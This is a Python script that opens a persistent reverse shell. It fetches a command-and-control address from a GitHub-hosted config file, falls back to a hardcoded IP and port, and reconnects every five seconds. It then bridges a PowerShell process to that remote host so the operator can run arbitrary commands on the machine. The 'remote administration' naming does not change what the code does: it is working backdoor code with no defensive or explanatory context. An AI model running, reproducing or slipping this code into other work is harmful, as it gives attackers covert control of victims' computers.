import socket
import subprocess
import platform
import time
import threading

hubUrl = 'https://github.com/Neponel228/HZ_ServerRemoteAdministration/raw/refs/heads/main/'

def execute_command(command):
    try:
        if platform.system().lower() == 'windows':
            return subprocess.check_output('powershell ' + command, shell=True, stderr=subprocess.STDOUT, text=True)
        else:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        return e.output or ""

def fetch_server_config():
    try:
        while True:
            config = execute_command(f'curl {hubUrl}config.txt')
            address = config.split('Content')[1].split(': ')[1].split('\n')[0]
            ip, port = address.split(':')
            if len(ip) > 0:
                break
            time.sleep(5)
        return ip.strip(), int(port.strip())
    except:
        return '62.60.149.15', 1488

def connect_to_server(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            return s
        except:
            time.sleep(5)

def s2p(s, p, reconnect_flag):
    try:
        while True:
            data = s.recv(BUFFER_SIZE)
            if not data:
                break
            p.stdin.write(data)
            p.stdin.flush()
    except:
        pass
    finally:
        reconnect_flag.set()

def p2s(s, p, reconnect_flag):
    try:
        while True:
            s.send(p.stdout.read(1))
    except:
        pass
    finally:
        reconnect_flag.set()

def handle_connection():
    global SERVER_IP, SERVER_PORT
    while True:
        s = connect_to_server(SERVER_IP, SERVER_PORT)
        reconnect_flag = threading.Event()
        p = subprocess.Popen(["powershell"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        s2p_thread = threading.Thread(target=s2p, args=(s, p, reconnect_flag))
        p2s_thread = threading.Thread(target=p2s, args=(s, p, reconnect_flag))
        s2p_thread.start()
        p2s_thread.start()
        reconnect_flag.wait()
        s.close()
        p.terminate()

SERVER_IP, SERVER_PORT = fetch_server_config()
BUFFER_SIZE = 1024

try:
    handle_connection()
except KeyboardInterrupt:
    pass
